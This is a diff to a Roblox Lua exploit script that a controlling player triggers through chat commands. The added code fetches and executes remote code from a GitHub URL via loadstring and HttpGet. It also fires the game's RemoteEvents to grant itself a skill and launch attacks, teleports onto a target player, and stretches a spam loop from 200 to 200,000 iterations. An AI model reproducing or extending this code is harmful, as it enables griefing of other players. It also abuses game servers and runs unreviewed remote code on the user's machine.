@@ -1,7 +1,7 @@
 local Players = game:GetService("Players")
 local plrr = "zzotac"
 local plrr2 = game.Players.zzotac
-local target = game.Players.LegendaryPallBearer
+local target = game.Players.zzotac
 local event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents
 
 if game.Players.LocalPlayer.Name == plrr then
@@ -131,9 +131,28 @@ end)
 
 event.OnMessageDoneFiltering.OnClientEvent:Connect(function(click)
   if click.FromSpeaker == plrr then
-      if click.Message == ".annoytarget" then
-          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+      if click.Message == ".annoy" then
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/oppswisser/zzotac/main/fsa'))()
+      wait()
+local args = {
+    [1] = "Vanish Strike"
+}
+
+game:GetService("ReplicatedStorage").Events.giveskill:FireServer(unpack(args))
+wait(0.2)
+
+local args = {
+    [1] = "VanishStrike",
+    [2] = 80,
+    [3] = 80,
+    [4] = game:GetService("Players").LocalPlayer.Backpack["Vanish Strike"],
+    [5] = "White"
+ }
+
+game:GetService("ReplicatedStorage").Events.heavy:FireServer(unpack(args))
           wait(0.5)
+          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+          wait(0.1)
 local function RemoveSpaces(String)
     return String:gsub("%s+", "") or String
 end
@@ -150,8 +169,8 @@ end
 
 targetname = target.Name                -- NAME
 
-for i = 1,200 do
-wait(1)
+for i = 1,200000 do
+wait(0.5)
 
 local tbl_main = 
 {
